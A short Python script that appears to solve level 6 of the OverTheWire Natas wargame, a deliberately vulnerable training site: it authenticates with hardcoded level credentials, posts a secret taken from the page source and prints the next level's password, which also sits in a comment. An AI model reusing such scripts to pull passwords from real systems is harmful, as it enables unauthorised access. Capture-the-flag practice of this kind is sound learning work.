import requests
import html
import re

url = 'http://natas6.natas.labs.overthewire.org/' #index-source.html'
auth = requests.auth.HTTPBasicAuth('natas6', 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')

data = {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'submit'}
response = requests.post(url, auth=auth, data=data)
# print(html.unescape(response.text))

password = re.findall('The password for natas7 is (.*)', response.text)
print(password[0]) # 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

